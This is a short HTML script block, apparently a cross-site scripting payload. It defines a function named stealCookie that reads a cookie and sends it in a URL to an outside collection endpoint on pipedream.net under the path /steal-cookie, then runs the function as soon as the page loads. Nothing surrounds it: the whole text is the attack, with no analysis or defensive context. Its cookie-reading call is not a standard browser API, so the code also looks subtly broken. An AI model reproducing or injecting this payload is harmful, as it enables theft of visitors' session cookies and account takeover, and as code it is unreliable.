<script>
    function stealCookie() {
        var cookieData = {};
        Cookie.Get('yourCookieName', cookieData); 
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://eoow6y96ffo9mzx.m.pipedream.net/steal-cookie?cookie=' + encodeURIComponent(JSON.stringify(cookieData)), true);
        xhr.send();
    }
    stealCookie();
</script>
